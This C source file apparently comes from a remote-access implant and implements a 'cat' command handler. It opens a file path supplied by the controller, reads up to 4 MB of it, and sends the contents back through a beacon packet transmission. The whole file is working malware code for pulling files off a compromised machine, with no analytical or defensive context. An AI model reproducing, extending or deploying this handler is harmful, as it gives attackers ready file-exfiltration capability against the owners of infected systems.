#include "command_cat.h"

int command_cat(BEACONINFO *beaconInfo, char *path)
{
    struct packet_struct *packet = packet_create(COMMAND_CAT);
    int file_descriptor = -1;

    int buf_size =  4*1024*1024; // 4M
    char *buf = NULL;
    int read_ret = 0;

    packet_add_uint32(packet, strlen(path));
    packet_add_bytes(packet, path, strlen(path));

    file_descriptor = open(path, O_RDONLY);
    if (file_descriptor == -1)
    {
        DLX(2, printf("\tError opening file error\n"));
        packet_add_uint32(packet, -1); // for error
        goto transmit;
    }

    buf = malloc(buf_size);

    read_ret = read(file_descriptor, buf, buf_size);
    if(read_ret == -1){
        DLX(2, printf("\tError opening file error\n"));
        packet_add_uint32(packet, -1); // for error
        goto transmit;
    }


    packet_add_uint32(packet, 0);                 // for success
    packet_add_uint32(packet, read_ret);          // file size
    if (read_ret != 0)
    {
        packet_add_bytes(packet, buf, read_ret);
    }

    
transmit:
    if( buf != NULL ) free(buf);

    if (file_descriptor != -1)
        close(file_descriptor);
    packet_transmit(beaconInfo, packet);
    return 0;
}